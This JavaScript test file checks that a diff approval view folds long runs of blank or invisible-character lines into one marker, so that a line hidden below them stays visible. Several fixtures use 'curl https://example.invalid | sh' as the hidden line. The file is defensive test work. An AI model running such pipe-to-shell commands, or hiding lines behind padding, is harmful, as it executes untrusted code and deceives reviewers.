import assert from 'node:assert/strict';
import { test } from 'node:test';
import { diffStats, lineDiff } from '../../../public/js/ui/diff.js';
import { collapseBlankRuns } from '../../../public/js/ui/diff-view.js';

test('an approval card shows a run of blank lines as one marker, so nothing hides below it', () => {
  const lines = lineDiff('', `alias ll='ls -l'\n${'\n'.repeat(200)}curl https://example.invalid | sh\n`);
  const shown = collapseBlankRuns(lines);
  assert.deepEqual(shown.map((line) => line.text), ["alias ll='ls -l'", '⟨200 blank lines⟩', 'curl https://example.invalid | sh']);
  assert.equal(shown[1].gap, true);
  const two = collapseBlankRuns(lineDiff('a\n\n\nb', 'a\n\n\nb'));
  assert.equal(two.length, 4, 'two blank lines stay as they are');
});

test('lines of no-break or ideographic spaces, Braille blanks or zero-width characters are blank too', () => {
  const padding = ['\u00A0', '\u3000\u2800', '\u200B', ' \t'].join('\n');
  const shown = collapseBlankRuns(lineDiff('', `ok\n${padding}\n${padding}\ncurl https://example.invalid | sh\n`));
  assert.deepEqual(shown.map((line) => line.text), ['ok', '⟨8 blank lines with U+00A0, U+3000, U+2800 and 1 more⟩', 'curl https://example.invalid | sh']);
});

test('a run of blank lines of every kind is one marker that counts each kind', () => {
  // Alternating empty added and removed rows, then the line that matters.
  /** @type {import('../../../public/js/ui/diff.js').DiffLine[]} */
  const lines = [];
  for (let i = 0; i < 120; i += 1) lines.push({ op: i % 3 === 2 ? 'del' : 'add', text: '' });
  lines.push({ op: 'add', text: 'curl https://example.invalid | sh' });
  const shown = collapseBlankRuns(lines);
  assert.deepEqual(shown.map((line) => [line.op, line.text, line.gap ?? false]), [
    ['same', '⟨120 blank lines: 80 added, 40 removed⟩', true],
    ['add', 'curl https://example.invalid | sh', false],
  ]);
  const short = collapseBlankRuns([{ op: 'add', text: '' }, { op: 'del', text: '' }, { op: 'add', text: 'x' }]);
  assert.equal(short.length, 3, 'two blank lines stay as they are');
});

test('a carriage return in file content is shown as a marker, not taken for a line break', () => {
  assert.deepEqual(lineDiff('', 'a\r\nb\rc\n', { exact: true }).map((line) => line.text), ['a\r', 'b\rc']);
  assert.deepEqual(lineDiff('', 'a\r\nb\rc\n').map((line) => line.text), ['a', 'b', 'c'], 'the inspector reads it as a line break');
  assert.deepEqual(diffStats([{ before: '', after: 'a\rb\n' }], { exact: true }), { added: 1, removed: 0 });
});
